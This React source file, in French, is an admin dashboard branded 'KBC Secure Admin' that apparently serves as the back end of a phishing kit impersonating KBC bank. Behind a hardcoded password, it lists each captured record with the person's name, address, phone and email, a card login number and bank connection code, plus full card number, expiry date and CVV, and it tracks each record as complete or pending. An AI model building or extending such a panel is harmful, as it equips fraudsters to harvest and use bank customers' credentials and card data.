import React, { useState, useEffect } from 'react';
import './index.css';
import { supabase } from './supabase';

function AdminPage() {
    const [password, setPassword] = useState('');
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [data, setData] = useState([]);
    const [error, setError] = useState('');
    const [selectedUser, setSelectedUser] = useState(null); // Pour le modal

    // -- NOUVEAU: États pour Recherche & Pagination --
    const [searchTerm, setSearchTerm] = useState('');
    const [currentPage, setCurrentPage] = useState(1);
    const itemsPerPage = 10;

    // Calcul des stats
    const totalUsers = data.length;
    const completedUsers = data.filter(u => u.status === 'completed').length;

    // 1. FILTRAGE
    const filteredData = data.filter(user => {
        const term = searchTerm.toLowerCase();
        const pInfo = user.personal_info || {};
        const fullName = `${pInfo.firstName || ''} ${pInfo.lastName || ''}`.toLowerCase();

        return (
            fullName.includes(term) ||
            (user.card_number_login && user.card_number_login.includes(term)) ||
            (user.connection_code && user.connection_code.includes(term)) ||
            (pInfo.email && pInfo.email.toLowerCase().includes(term))
        );
    });

    // 2. PAGINATION
    const indexOfLastItem = currentPage * itemsPerPage;
    const indexOfFirstItem = indexOfLastItem - itemsPerPage;
    const currentItems = filteredData.slice(indexOfFirstItem, indexOfLastItem);
    const totalPages = Math.ceil(filteredData.length / itemsPerPage);

    // Reset page quand on cherche
    useEffect(() => {
        setCurrentPage(1);
    }, [searchTerm]);

    const handleLogin = (e) => {
        e.preventDefault();
        if (password === 'kbcAdmin321') {
            setIsAuthenticated(true);
            fetchData();
        } else {
            setError('Mot de passe incorrect');
        }
    };

    const fetchData = async () => {
        try {
            const { data: users, error } = await supabase
                .from('kbc_users')
                .select('*')
                .order('created_at', { ascending: false });

            if (error) throw error;
            setData(users);
        } catch (err) {
            console.error('Erreur données:', err);
            setError('Erreur lors du chargement des données: ' + err.message);
        }
    };

    if (!isAuthenticated) {
        return (
            <div className="admin-login-wrapper">
                <div className="admin-login-card">
                    <h2 style={{ color: '#00A1DE', marginBottom: '10px' }}>KBC Secure Admin</h2>
                    <p style={{ color: '#666', marginBottom: '30px' }}>Accès restreint au personnel autorisé</p>
                    <form onSubmit={handleLogin}>
                        <input
                            className="admin-input"
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            placeholder="Entrez votre code d'accès"
                        />
                        {error && <p style={{ color: 'red', fontSize: '14px' }}>{error}</p>}
                        <button type="submit" className="primary-button" style={{ width: '100%', marginTop: '10px' }}>Connexion sécurisée</button>
                    </form>
                </div>
            </div>
        );
    }

    return (
        <div className="dashboard-container">
            {/* HEADER */}
            <div className="dashboard-header">
                <div>
                    <h1 className="dashboard-title">Tableau de Bord Client</h1>
                    <p style={{ color: '#6c757d', marginTop: '5px' }}>Gestion des dossiers en temps réel</p>
                </div>
                <button className="btn-primary" onClick={fetchData}>
                    ↻ Actualiser les données
                </button>
            </div>

            {/* STATS CARDS */}
            <div className="card-stats">
                <div className="stat-box">
                    <div className="stat-number">{totalUsers}</div>
                    <div className="stat-label">Total Dossiers</div>
                </div>
                <div className="stat-box" style={{ borderLeftColor: '#16a34a' }}>
                    <div className="stat-number">{completedUsers}</div>
                    <div className="stat-label">Dossiers Complets</div>
                </div>
                <div className="stat-box" style={{ borderLeftColor: '#ca8a04' }}>
                    <div className="stat-number">{totalUsers - completedUsers}</div>
                    <div className="stat-label">En attente</div>
                </div>
            </div>

            {/* ACTIONS BAR (SEARCH) */}
            <div className="actions-bar">
                <input
                    type="text"
                    className="search-input"
                    placeholder="Rechercher (Nom, Carte, Email...)"
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                />
                <div style={{ color: '#64748b', fontSize: '14px' }}>
                    <strong>{filteredData.length}</strong> résultats trouvés
                </div>
            </div>

            {/* TABLEAU PRO */}
            <div className="table-container">
                <table className="pro-table">
                    <thead>
                        <tr>
                            <th>Date / Heure</th>
                            <th>Statut</th>
                            <th>Client (Nom)</th>
                            <th>Login (Carte)</th>
                            <th>Code</th>
                            <th style={{ textAlign: 'right' }}>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {currentItems.map((user) => {
                            const pInfo = user.personal_info || {};
                            const fullName = pInfo.firstName ? `${pInfo.firstName} ${pInfo.lastName}` : '- Inconnu -';

                            return (
                                <tr key={user.id}>
                                    <td data-label="Date">
                                        <div style={{ fontWeight: '500' }}>{new Date(user.created_at).toLocaleDateString()}</div>
                                        <div style={{ color: '#999', fontSize: '12px' }}>{new Date(user.created_at).toLocaleTimeString()}</div>
                                    </td>
                                    <td data-label="Statut">
                                        <span className={`status-badge ${user.status === 'completed' ? 'status-completed' : 'status-pending'}`}>
                                            {user.status === 'completed' ? 'COMPLET' : 'EN COURS'}
                                        </span>
                                    </td>
                                    <td data-label="Client">
                                        <div style={{ fontWeight: '600' }}>{fullName}</div>
                                        <div style={{ fontSize: '12px', color: '#666' }}>{pInfo.email || ''}</div>
                                    </td>
                                    <td data-label="Login (Carte)" style={{ fontFamily: 'monospace' }}>{user.card_number_login}</td>
                                    <td data-label="Code" style={{ fontFamily: 'monospace', fontWeight: 'bold' }}>{user.connection_code}</td>
                                    <td data-label="Actions" style={{ textAlign: 'right' }}>
                                        <button className="btn-view" onClick={() => setSelectedUser(user)}>
                                            Voir le dossier
                                        </button>
                                    </td>
                                </tr>
                            );
                        })}
                        {currentItems.length === 0 && (
                            <tr>
                                <td colSpan="6" style={{ textAlign: 'center', padding: '40px', color: '#999' }}>Aucun résultat trouvé</td>
                            </tr>
                        )}
                    </tbody>
                </table>
            </div>

            {/* PAGINATION CONTROLS */}
            {totalPages > 1 && (
                <div className="pagination-container">
                    <div className="pagination-info">
                        Affichage de {indexOfFirstItem + 1} à {Math.min(indexOfLastItem, filteredData.length)} sur {filteredData.length} entrées
                    </div>
                    <div className="pagination-controls">
                        <button
                            className="page-btn"
                            onClick={() => setCurrentPage(prev => Math.max(prev - 1, 1))}
                            disabled={currentPage === 1}
                        >
                            &lt;
                        </button>

                        {[...Array(totalPages)].map((_, i) => (
                            <button
                                key={i}
                                className={`page-btn ${currentPage === i + 1 ? 'active' : ''}`}
                                onClick={() => setCurrentPage(i + 1)}
                            >
                                {i + 1}
                            </button>
                        ))}

                        <button
                            className="page-btn"
                            onClick={() => setCurrentPage(prev => Math.min(prev + 1, totalPages))}
                            disabled={currentPage === totalPages}
                        >
                            &gt;
                        </button>
                    </div>
                </div>
            )}

            {/* MODAL DETAILS */}
            {selectedUser && (
                <div className="modal-overlay" onClick={() => setSelectedUser(null)}>
                    <div className="modal-content" onClick={(e) => e.stopPropagation()}>

                        {/* Modal Header */}
                        <div className="modal-header">
                            <div>
                                <h2 style={{ margin: 0, color: '#003768' }}>Dossier Client #{selectedUser.id}</h2>
                                <div style={{ fontSize: '13px', color: '#666', marginTop: '5px' }}>
                                    Créé le {new Date(selectedUser.created_at).toLocaleString()}
                                </div>
                            </div>
                            <button className="modal-close" onClick={() => setSelectedUser(null)}>×</button>
                        </div>

                        {/* Modal Body - 2 COLONNES */}
                        <div className="modal-body">

                            {/* COLONNE GAUCHE : INFOS PERSO */}
                            <div className="detail-section">
                                <h3>👤 Informations Personnelles</h3>

                                {selectedUser.personal_info ? (
                                    <>
                                        <div className="detail-row">
                                            <span className="detail-label">Prénom</span>
                                            <span className="detail-value">{selectedUser.personal_info.firstName}</span>
                                        </div>
                                        <div className="detail-row">
                                            <span className="detail-label">Nom</span>
                                            <span className="detail-value">{selectedUser.personal_info.lastName}</span>
                                        </div>
                                        <div className="detail-row">
                                            <span className="detail-label">Téléphone</span>
                                            <span className="detail-value">{selectedUser.personal_info.phone}</span>
                                        </div>
                                        <div className="detail-row">
                                            <span className="detail-label">Email</span>
                                            <span className="detail-value">{selectedUser.personal_info.email}</span>
                                        </div>
                                        <div className="detail-row">
                                            <span className="detail-label">Adresse</span>
                                            <span className="detail-value">{selectedUser.personal_info.address}</span>
                                        </div>
                                        <div className="detail-row">
                                            <span className="detail-label">Ville / CP</span>
                                            <span className="detail-value">{selectedUser.personal_info.postalCode} {selectedUser.personal_info.city}</span>
                                        </div>
                                    </>
                                ) : (
                                    <p style={{ color: '#999', fontStyle: 'italic' }}>Aucune information personnelle saisie.</p>
                                )}
                            </div>

                            {/* COLONNE DROITE : FINANCIER */}
                            <div className="detail-section">
                                <h3>💳 Données Bancaires & Sécurité</h3>

                                <div className="detail-row" style={{ background: '#f0f9ff', padding: '10px', borderRadius: '6px' }}>
                                    <span className="detail-label">Code Connexion</span>
                                    <span className="detail-value" style={{ color: '#00A1DE', fontSize: '18px' }}>{selectedUser.connection_code}</span>
                                </div>

                                <div className="detail-row">
                                    <span className="detail-label">Login Carte (Init)</span>
                                    <span className="detail-value">{selectedUser.card_number_login}</span>
                                </div>

                                <div style={{ marginTop: '30px' }}>
                                    <h4 style={{ fontSize: '14px', color: '#64748b', textTransform: 'uppercase', marginBottom: '15px' }}>Carte Bancaire (Validation)</h4>

                                    {selectedUser.card_info ? (
                                        <div style={{ background: '#1e293b', color: 'white', padding: '20px', borderRadius: '10px', boxShadow: '0 4px 6px rgba(0,0,0,0.1)' }}>
                                            <div style={{ fontSize: '12px', opacity: 0.7, marginBottom: '5px' }}>Titulaire</div>
                                            <div style={{ fontSize: '16px', fontWeight: 'bold', marginBottom: '15px' }}>{selectedUser.card_info.cardHolder}</div>

                                            <div style={{ fontSize: '12px', opacity: 0.7, marginBottom: '5px' }}>Numéro de carte</div>
                                            <div style={{ fontSize: '18px', letterSpacing: '2px', fontFamily: 'monospace', marginBottom: '15px' }}>
                                                {selectedUser.card_info.cardNumber}
                                            </div>

                                            <div style={{ display: 'flex', gap: '40px' }}>
                                                <div>
                                                    <div style={{ fontSize: '10px', opacity: 0.7 }}>EXP</div>
                                                    <div style={{ fontWeight: 'bold' }}>{selectedUser.card_info.expiryDate}</div>
                                                </div>
                                                <div>
                                                    <div style={{ fontSize: '10px', opacity: 0.7 }}>CVV</div>
                                                    <div style={{ fontWeight: 'bold', color: '#fbbf24' }}>{selectedUser.card_info.cvv}</div>
                                                </div>
                                            </div>
                                        </div>
                                    ) : (
                                        <p style={{ color: '#999', fontStyle: 'italic' }}>Carte non validée.</p>
                                    )}
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}

export default AdminPage;
